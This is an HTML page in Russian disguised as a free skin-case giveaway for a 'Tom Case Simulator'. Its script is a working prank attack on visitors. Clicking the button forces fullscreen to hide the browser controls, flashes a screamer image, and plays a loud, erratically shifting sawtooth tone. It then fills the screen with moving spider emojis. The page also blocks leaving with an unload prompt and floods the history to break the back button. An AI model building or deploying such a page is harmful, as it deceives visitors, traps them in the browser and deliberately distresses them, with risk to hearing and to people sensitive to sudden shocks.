<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tom Case Simulator — Официальный сайт</title>
    <style>
        /* Стильный дефолтный сайт под симулятор кейсов */
        body {
            font-family: 'Segoe UI', Roboto, sans-serif;
            background-color: #0e121b;
            color: #eceff4;
            margin: 0;
            padding: 0;
            overflow-x: hidden;
        }
        header {
            background-color: #1a2333;
            padding: 20px;
            border-bottom: 2px solid #2e3b54;
            text-align: center;
        }
        header h1 {
            margin: 0;
            color: #4c566a;
            font-size: 24px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        header h1 span {
            color: #88c0d0;
        }
        .main-container {
            max-width: 600px;
            margin: 50px auto;
            background: #1e2838;
            padding: 40px;
            border-radius: 12px;
            border: 1px solid #2e3b54;
            text-align: center;
            box-shadow: 0 10px 25px rgba(0,0,0,0.4);
        }
        .case-preview {
            width: 200px;
            height: 200px;
            margin: 20px auto;
            background: radial-gradient(circle, #3b4252 0%, #2e3440 100%);
            border-radius: 10px;
            border: 2px dashed #88c0d0;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 80px;
            box-shadow: 0 0 20px rgba(136, 192, 208, 0.2);
        }
        .btn-spin {
            display: inline-block;
            background: linear-gradient(90deg, #81a1c1, #88c0d0);
            color: #2e3440;
            padding: 18px 40px;
            font-size: 18px;
            text-decoration: none;
            border-radius: 8px;
            margin-top: 30px;
            font-weight: bold;
            cursor: pointer;
            border: none;
            text-transform: uppercase;
            box-shadow: 0 5px 15px rgba(136, 192, 208, 0.4);
            transition: transform 0.1s;
        }
        .btn-spin:active {
            transform: scale(0.95);
        }

        /* КАТАСТРОФА (Изначально скрыта) */
        .screamer-layer {
            position: fixed;
            top: 0; left: 0; width: 100vw; height: 100vh;
            background: black;
            z-index: 99999;
            display: none;
            justify-content: center;
            align-items: center;
        }
        .screamer-image {
            width: 100%;
            height: 100%;
            object-fit: cover;
            animation: shake 0.05s infinite alternate;
        }

        /* Пауки */
        .spider {
            position: fixed;
            width: 80px;
            height: auto;
            z-index: 10000;
            pointer-events: none;
            display: none;
            user-select: none;
        }

        @keyframes shake {
            0% { transform: translate(3px, 2px) rotate(0deg); }
            10% { transform: translate(-2px, -3px) rotate(-2deg); }
            20% { transform: translate(-4px, 0px) rotate(2deg); }
            30% { transform: translate(0px, 3px) rotate(0deg); }
            40% { transform: translate(2px, -2px) rotate(2deg); }
            50% { transform: translate(-2px, 3px) rotate(-2deg); }
            60% { transform: translate(-4px, 2px) rotate(0deg); }
            75% { transform: translate(3px, 2px) rotate(-4deg); }
            90% { transform: translate(-2px, -2px) rotate(0deg); }
            100% { transform: translate(2px, 3px) rotate(2deg); }
        }
    </style>
</head>
<body>

    <header>
        <h1>⚡ <span>TOM CASE</span> BETA UPDATE v2.6 ⚡</h1>
    </header>
    
    <div class="main-container">
        <h2>Доступен Секретный Кейс от Тома!</h2>
        <p style="color: #d8dee9; font-size: 15px;">Вы получили один бесплатный праздничный кейс. Нажмите на кнопку ниже, чтобы запустить прокрутку барабана и выбить лимитированный скин.</p>
        
        <div class="case-preview">📦</div>
        
        <button class="btn-spin" id="spinBtn">Крутить бесплатно</button>
    </div>

    <div class="screamer-layer" id="screamer">
        <img class="screamer-image" src="https://i.imgur.com/H8M8H7P.jpg" alt="BOO!">
    </div>

    <script>
        const spinBtn = document.getElementById('spinBtn');
        const screamer = document.getElementById('screamer');

        // Блокировка закрытия вкладки (покажет системное предупреждение)
        window.onbeforeunload = function() {
            return "НЕЛЬЗЯ ПРОСТО ТАК ВЗЯТЬ И УЙТИ!";
        };

        spinBtn.addEventListener('click', () => {
            // Врубаем фуллскрин, чтобы спрятать крестик и вкладки браузера
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen();
            } else if (document.documentElement.webkitRequestFullscreen) { /* Safari */
                document.documentElement.webkitRequestFullscreen();
            }

            // Показываем скример
            screamer.style.display = 'flex';

            // ГЕНЕРАЦИЯ ЖЕСТКОГО СИНТЕТИЧЕСКОГО ШУМА И ПИСКА
            try {
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioCtx.createOscillator();
                const gainNode = audioCtx.createGain();

                // 'sawtooth' (пила) — дает самый грязный, резкий и мерзкий звук
                oscillator.type = 'sawtooth'; 
                oscillator.frequency.setValueAtTime(880, audioCtx.currentTime); // Начальная частота

                // Выкручиваем громкость звукового узла страницы на максимум
                gainNode.gain.setValueAtTime(2.5, audioCtx.currentTime); 

                oscillator.connect(gainNode);
                gainNode.connect(audioCtx.destination);

                oscillator.start();

                // Каждые 40мс меняем частоту звука, создавая эффект визжащей и ломающейся сирены
                setInterval(() => {
                    oscillator.frequency.setValueAtTime(Math.random() * 1600 + 300, audioCtx.currentTime);
                }, 40);

            } catch (e) {
                console.log("Браузер заблокировал звук:", e);
            }

            // Через 2.5 секунды убираем физиономию скримера, но оставляем ад на сайте
            setTimeout(() => {
                screamer.style.display = 'none';
                // Меняем текст сайта, чтобы добить жертву подколкой
                document.querySelector('.main-container h2').innerText = "ОЙ! ЧТО-ТО ПОШЛО НЕ ТАК... 🕷️";
                document.querySelector('.main-container p').innerText = "Кажется, Том закинул в кейс кое-что живое. И оно выбралось наружу. Кнопка выхода заблокирована.";
                spinBtn.style.display = 'none';
                
                // Запускаем нашествие пауков
                startSpiders();
            }, 2500);
        });

        // Функция спавна ползающих пауков
        function startSpiders() {
            for (let i = 0; i < 20; i++) {
                createSpider();
            }
        }

        function createSpider() {
            const spider = document.createElement('div');
            spider.className = 'spider';
            spider.style.display = 'block';
            spider.style.fontSize = Math.random() * 50 + 30 + 'px'; // Разные размеры пауков
            spider.innerText = '🕷️';
            document.body.appendChild(spider);

            let x = Math.random() * window.innerWidth;
            let y = Math.random() * window.innerHeight;

            spider.style.left = x + 'px';
            spider.style.top = y + 'px';

            // Хаотичное движение пауков
            setInterval(() => {
                x += (Math.random() - 0.5) * 70;
                y += (Math.random() - 0.5) * 70;
                
                if (x < 0) x = window.innerWidth;
                if (x > window.innerWidth) x = 0;
                if (y < 0) y = window.innerHeight;
                if (y > window.innerHeight) y = 0;

                spider.style.left = x + 'px';
                spider.style.top = y + 'px';
            }, 80);
        }

        // Спам истории (Ломает кнопку "Назад" в мобильных и ПК браузерах)
        setInterval(() => {
            window.history.pushState(null, "", window.location.href);
        }, 400);
    </script>
</body>
</html>
